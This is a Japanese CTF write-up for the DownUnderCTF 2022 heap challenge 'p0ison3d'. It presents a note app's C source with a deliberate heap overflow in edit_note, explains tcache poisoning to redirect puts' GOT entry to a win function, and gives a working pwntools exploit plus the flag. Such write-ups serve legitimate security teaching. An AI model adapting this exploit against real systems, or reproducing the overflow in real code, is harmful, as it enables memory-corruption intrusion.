# DownUnderCTF 2022 `p0ison3d [pwn]` writeup

## 問題
Implemented my own note-taking app! Unfortunately I can only add three notes at a time.

`nc 2022.ductf.dev 30024`

バイナリファイルとソースコード、libcが提供される。

```c
// gcc p0ison3d.c -o p0ison3d -fPIE -no-pie

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

typedef struct note {
    int   allocated;
    char* data;
} note_t;

note_t storage[3];

void print_menu()
{
    printf("\n");

    puts("[1] add new note");
    puts("[2] read note");
    puts("[3] edit note");
    puts("[4] delete note");
    puts("[5] quit");
}

int get_choice()
{
    puts("choice:");

    int choice;
    if (!scanf("%d", &choice)) {
        return -1;
    }

    // flush stdin
    int c;
    while ((c = getchar()) != '\n' && c != EOF);

    return choice;
}

int get_index()
{
    puts("index:");

    int index;
    if (!scanf("%d", &index) ||
            (index < 0 || index >= 3)) {
        return -1;
    }

    // flush stdin
    int c;
    while ((c = getchar()) != '\n' && c != EOF);

    return index;
}

char* get_data(char* dest, int size)
{
    puts("data:");

    char* ret = fgets(dest, size, stdin);
    return ret;
}

void read_note()
{
    int index = get_index();
    if (index < 0) {
        puts("error: bad index");
        return;
    }
    if (!storage[index].allocated) {
        puts("error: index not allocated");
        return;
    }

    printf("data: %s\n", storage[index].data);
}

void add_note()
{
    int index = get_index();
    if (index < 0) {
        puts("error: bad index");
        return;
    }
    if (storage[index].allocated) {
        puts("error: index already allocated");
        return;
    }

    char* data = (char*)malloc(128);
    if (!get_data(data, 128)) {
        puts("error: unable to read input");
        return;
    }
    storage[index].data = data;
    storage[index].allocated = 1;
}

void edit_note()
{
    int index = get_index();
    if (index < 0) {
        puts("error: bad index");
        return;
    }
    if (!storage[index].allocated) {
        puts("error: index not allocated");
        return;
    }

    if (!get_data(storage[index].data, 153)) {
        puts("error: unable to read input");
        return;
    }
}

void del_note()
{
    int index = get_index();
    if (index < 0) {
        puts("error: bad index");
        return;
    }
    if (!storage[index].allocated) {
        puts("error: index not allocated");
        return;
    }

    free(storage[index].data);
    storage[index].data = NULL;
    storage[index].allocated = 0;
}

void quit()
{
    puts("\ngoodbye!");
    exit(0);
}

int main(int argc, char** argv)
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);

    puts("ez-notes v0.1");
    puts(" v0.1 only supports up to 3 notes :(");

    while (1) {
        print_menu();

        int choice = get_choice();
        if (choice < 0 || choice > 5) {
            puts("error: bad choice");
            continue;
        }
        
        if (choice == 1) {
            add_note();
        }
        if (choice == 2) {
            read_note();
        }
        if (choice == 3) {
            edit_note();
        }
        if (choice == 4) {
            del_note();
        }
        if (choice == 5) {
            quit();
        }
    }

    return 0;
}

void win()
{
    system("cat ./flag.txt");
}
```

## 解法
よくあるノートを読み書きするタイプのheap問ですが3つまでしかノートを確保できない。
しかしながら、libcのバージョンは相当古いのでチェックはそこまで厳しくなさそう。
あと親切なことにwin関数を設置してくれています。

セキュリティ機構の確認から。

```
[*] '/home/caffeine/ctf/ductf22/pwn/p0ison3d/p0ison3d'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ELFのアドレスが既知でPartial RELROなのでputs関数のGOTをwinに書き換える方針で。
どうやってarbitrary address writeを達成するかだが、edit_note関数にheap overflowの脆弱性がある。
editするノートに続くチャンクをfreeしておいて、heap overflowで当該チャンクのfdをputsのGOTのアドレスに書き換え -> add_noteで当該チャンクを確保してwin関数のアドレスを書き込む。

これでOK、いわゆるtcache poisonig。
libcが古いのでsafe-linkingとか考える必要はありません。

## Exploit
```py
from pwn import *
import sys

elf = ELF("p0ison3d")
libc = ELF("libc-2.27.so")

# io = process(elf.path)
io = remote("2022.ductf.dev", 30024)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def add(idx, data):
    io.sendlineafter(b"choice:\n", b"1")
    io.sendlineafter(b"index:\n", idx)
    io.sendlineafter(b"data:\n", data)

def edit(idx, data):
    io.sendlineafter(b"choice:\n", b"3")
    io.sendlineafter(b"index:\n", idx)
    io.recvuntil(b"data:\n")
    io.send(data)

def delete(idx):
    io.sendlineafter(b"choice:\n", b"4")
    io.sendlineafter(b"index:\n", idx)

add(b"0", b"AAA")
add(b"1", b"AAA")
add(b"2", b"AAA")
delete(b"2")
delete(b"1")

p = b"A" * 136
p += p64(0x91)
p += p64(elf.got["puts"])
edit(b"0", p)
add(b"1", b"AAA")
add(b"2", p64(elf.sym["win"]))

io.interactive()
```

FLAG: `DUCTF{w3lc0ME_tO_tH3_h3ap_4nd_h4PPy_TC4che_p01s0nIng}`